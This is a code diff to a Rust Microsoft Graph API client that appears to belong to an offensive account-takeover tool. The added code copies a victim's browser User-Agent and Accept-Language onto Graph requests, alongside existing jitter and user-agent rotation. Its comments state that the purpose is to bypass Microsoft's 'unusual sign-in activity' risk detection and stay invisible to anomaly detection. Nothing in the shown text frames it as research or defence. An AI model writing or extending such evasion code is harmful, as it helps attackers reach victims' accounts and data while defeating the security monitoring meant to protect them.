@@ -174,11 +174,27 @@ pub struct GraphClient {
     client: Client,
     base_url: String,
     stealth: StealthConfig,
+    /// Victim's browser fingerprint — when set, all Graph API requests use
+    /// the victim's User-Agent and Accept-Language instead of a random UA.
+    /// This makes requests look like they come from the victim's own browser,
+    /// bypassing Microsoft's "unusual sign-in activity" risk detection.
+    fingerprint_ua: Option<String>,
+    fingerprint_lang: Option<String>,
 }
 
 impl GraphClient {
     pub fn new() -> Self {
         Self::with_stealth("https://graph.microsoft.com", StealthConfig::new())
+    }
+
+    /// Create a GraphClient that clones the victim's browser fingerprint.
+    /// All Graph API calls will use the victim's User-Agent and Accept-Language,
+    /// making them invisible to Microsoft's risk/anomaly detection engine.
+    pub fn with_fingerprint(ua: Option<String>, lang: Option<String>) -> Self {
+        let mut client = Self::with_stealth("https://graph.microsoft.com", StealthConfig::new());
+        client.fingerprint_ua = ua.filter(|s| !s.is_empty());
+        client.fingerprint_lang = lang.filter(|s| !s.is_empty());
+        client
     }
 
     #[cfg(test)]
@@ -196,6 +212,8 @@ impl GraphClient {
             client,
             base_url: base_url.to_string(),
             stealth,
+            fingerprint_ua: None,
+            fingerprint_lang: None,
         }
     }
 
@@ -208,6 +226,9 @@ impl GraphClient {
     }
 
     /// Send request with jitter, UA rotation, and exponential backoff retry on 429/5xx.
+    /// When fingerprint is set, uses the victim's real User-Agent and Accept-Language
+    /// instead of a random UA — making the request look like it came from the
+    /// victim's own browser.
     async fn send_with_retry(
         &self,
         request_builder: reqwest::RequestBuilder,
@@ -215,15 +236,33 @@ impl GraphClient {
         let max_retries = 3;
         let mut attempt = 0;
 
+        // Determine which User-Agent to use: victim's fingerprint (if set)
+        // or a random one from the stealth pool.
+        let ua = self.fingerprint_ua.as_deref()
+            .unwrap_or(&self.stealth.ua_pool.get_random());
+
+        // Add Accept-Language header if fingerprint is set
+        let add_lang = self.fingerprint_lang.as_deref();
+
         loop {
             self.stealth.jitter.apply().await;
 
             let builder = match request_builder.try_clone() {
-                Some(b) => b.header("User-Agent", self.stealth.ua_pool.get_random()),
+                Some(b) => {
+                    let mut b = b.header("User-Agent", ua);
+                    if let Some(lang) = add_lang {
+                        b = b.header("Accept-Language", lang);
+                    }
+                    b
+                }
                 None => {
                     // Non-cloneable body: send once without retry
-                    let res = request_builder
-                        .header("User-Agent", self.stealth.ua_pool.get_random())
+                    let mut b = request_builder
+                        .header("User-Agent", ua);
+                    if let Some(lang) = add_lang {
+                        b = b.header("Accept-Language", lang);
+                    }
+                    let res = b
                         .send()
                         .await
                         .context("HTTP request failed")?;
